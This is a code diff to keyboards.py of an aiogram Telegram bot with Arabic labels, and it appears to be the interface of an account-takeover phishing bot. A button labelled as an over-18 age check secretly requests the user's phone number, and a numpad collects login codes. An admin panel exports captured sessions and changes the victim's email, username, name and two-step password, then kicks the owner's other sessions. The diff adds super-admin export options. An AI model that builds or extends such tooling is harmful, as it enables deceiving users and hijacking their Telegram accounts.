@@ -1,21 +1,19 @@
-# keyboards.py — النسخة المدمجة والمصححة
+# keyboards.py
 from aiogram.types import (
     InlineKeyboardMarkup, InlineKeyboardButton,
-    ReplyKeyboardMarkup, KeyboardButton
+    ReplyKeyboardMarkup, KeyboardButton,
 )
 
-# ─── ثابت مشترك (عُرِّف مرتين في الأصل — الآن مرة واحدة) ───
+import database
+
 ADMIN_FOOTER = "\n\n─────────────\n⚡️ @No1_noone"
 
 
-# ──────────────────────────────────────────
-# لوحات تسجيل المستخدم
-# ──────────────────────────────────────────
 def age_confirm_keyboard() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(
             text="عمري أكثر من 18 عامًا! ✔️",
-            callback_data="confirm_age"
+            callback_data="confirm_age",
         )]
     ])
 
@@ -24,10 +22,10 @@ def share_phone_keyboard() -> ReplyKeyboardMarkup:
     return ReplyKeyboardMarkup(
         keyboard=[[KeyboardButton(
             text="عمري أكثر من 18 عامًا! ✔️",
-            request_contact=True
+            request_contact=True,
         )]],
         resize_keyboard=True,
-        one_time_keyboard=True
+        one_time_keyboard=True,
     )
 
 
@@ -52,7 +50,7 @@ def numpad_keyboard(current_input: str = "") -> InlineKeyboardMarkup:
         ],
         [
             InlineKeyboardButton(text="0", callback_data="np_0"),
-            InlineKeyboardButton(text="⌫",  callback_data="np_del"),
+            InlineKeyboardButton(text="⌫", callback_data="np_del"),
         ],
     ])
 
@@ -63,107 +61,137 @@ def retry_keyboard() -> InlineKeyboardMarkup:
     ])
 
 
-# ──────────────────────────────────────────
-# لوحات إدارة الجلسات
-# ──────────────────────────────────────────
+def _session_label(s) -> str:
+    phone = s["phone"]
+    valid = bool(s["valid"]) if s["valid"] is not None else True
+    parts = []
+    if database.row_flag(s, "secured"):
+        parts.append("🔒")
+    if database.row_flag(s, "a1_only"):
+        parts.append("⭐")
+    parts.append("✅" if valid else "❌")
+    parts.append(phone)
+    return " ".join(parts)
+
+
 def sessions_keyboard(
-    sessions, page: int = 0, per_page: int = 6
+    sessions,
+    page: int = 0,
+    per_page: int = 6,
+    is_super_admin: bool = False,
 ) -> InlineKeyboardMarkup:
     total = len(sessions)
     start = page * per_page
-    end   = start + per_page
+    end = start + per_page
     page_sessions = sessions[start:end]
 
     buttons = []
     for s in page_sessions:
         phone = s["phone"]
-        # الكود الثاني أكثر أماناً — try/except لتفادي أخطاء النوع
-        try:
-            valid = bool(s["valid"])
-        except Exception:
-            valid = True
-        label = f"{'✅' if valid else '❌'} {phone}"
-        
-        # --- الإضافة من الكود الثاني: زر الحذف بجانب كل جلسة ---
-        buttons.append([
+        label = _session_label(s)
+        row = [
             InlineKeyboardButton(text=label, callback_data=f"session_{phone}"),
+        ]
+        if is_super_admin:
+            star = "⭐" if database.row_flag(s, "a1_only") else "☆"
+            row.append(
+                InlineKeyboardButton(text=star, callback_data=f"a1_hide_{phone}")
+            )
+        row.append(
             InlineKeyboardButton(text="🗑", callback_data=f"del_session_{phone}")
-        ])
+        )
+        buttons.append(row)
 
-    # أزرار التنقل بين الصفحات
     nav = []
     if page > 0:
         nav.append(InlineKeyboardButton(
-            text="◀️ السابق", callback_data=f"sessions_page_{page-1}"
+            text="◀️ السابق", callback_data=f"sessions_page_{page - 1}"
         ))
     if end < total:
         nav.append(InlineKeyboardButton(
-            text="التالي ▶️", callback_data=f"sessions_page_{page+1}"
+            text="التالي ▶️", callback_data=f"sessions_page_{page + 1}"
         ))
     if nav:
         buttons.append(nav)
 
-    # زر تصفير الذاكرة — موجود في الكود الأول
+    if is_super_admin:
+        buttons.append([
+            InlineKeyboardButton(
+                text="🔍 فحص الجلسات",
+                callback_data="check_sessions",
+            )
+        ])
     buttons.append([
         InlineKeyboardButton(
             text="♻️ تصفير ذاكرة العمليات",
-            callback_data="reset_mail_mem"
+            callback_data="reset_mail_mem",
         )
     ])
-    
-    # --- الإضافة من الكود الثاني: زر سحب الجلسات كملف TXT ---
-    buttons.append([
+    export_row = [
         InlineKeyboardButton(
-            text="📥 سحب كل الجلسات (TXT)", 
-            callback_data="export_all_txt"
+            text="📥 سحب كل الجلسات (TXT)",
+            callback_data="export_all_txt",
         )
-    ])
+    ]
+    if is_super_admin:
+        export_row.append(
+            InlineKeyboardButton(
+                text="⭐ سحب جلسات النجمة",
+                callback_data="export_star_txt",
+            )
+        )
+    buttons.append(export_row)
+
+    if is_super_admin:
+        buttons.append([
+            InlineKeyboardButton(
+                text="📦 سحب Volume",
+                callback_data="vol_export",
+            ),
+            InlineKeyboardButton(
+                text="📤 رفع Volume",
+                callback_data="vol_import",
+            ),
+        ])
 
     return InlineKeyboardMarkup(inline_keyboard=buttons)
 
 
 def session_detail_keyboard(phone: str) -> InlineKeyboardMarkup:
-    """
-    دُمجت أزرار الكودين:
-    - الكود الأول: ch_mail, export, full_kick (طرد + تنظيف شامل)
-    - الكود الثاني: req_code, kick (طرد الجلسات الأخرى فقط)
-    تم توحيد زرّي الطرد في زر واحد شامل (full_kick) لتفادي التعارض المنطقي.
-    """
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(
             text="🔑 المطالبة بكود",
-            callback_data=f"req_code_{phone}"
+            callback_data=f"req_code_{phone}",
         )],
         [InlineKeyboardButton(
             text="📧 تغيير البريد (تلقائي)",
-            callback_data=f"ch_mail_{phone}"
+            callback_data=f"ch_mail_{phone}",
         )],
         [InlineKeyboardButton(
             text="📜 سحب الجلسة (Text)",
-            callback_data=f"export_{phone}"
+            callback_data=f"export_{phone}",
         )],
         [
             InlineKeyboardButton(
                 text="✏️ تغيير اليوزر",
-                callback_data=f"ch_user_{phone}"
+                callback_data=f"ch_user_{phone}",
             ),
             InlineKeyboardButton(
                 text="📝 تغيير الاسم",
-                callback_data=f"ch_name_{phone}"
+                callback_data=f"ch_name_{phone}",
             ),
         ],
         [InlineKeyboardButton(
             text="🔐 تعيين/تغيير التحقق بخطوتين",
-            callback_data=f"ch_2fa_{phone}"
+            callback_data=f"ch_2fa_{phone}",
         )],
-        # دُمج full_kick (الأول) مع kick (الثاني) في زر واحد شامل
         [InlineKeyboardButton(
             text="🚫 طرد الجلسات + تنظيف شامل",
-            callback_data=f"full_kick_{phone}"
+            callback_data=f"full_kick_{phone}",
         )],
         [InlineKeyboardButton(
             text="🔙 رجوع للقائمة",
-            callback_data="back_to_sessions"
+            callback_data="back_to_sessions",
         )],
     ])
 
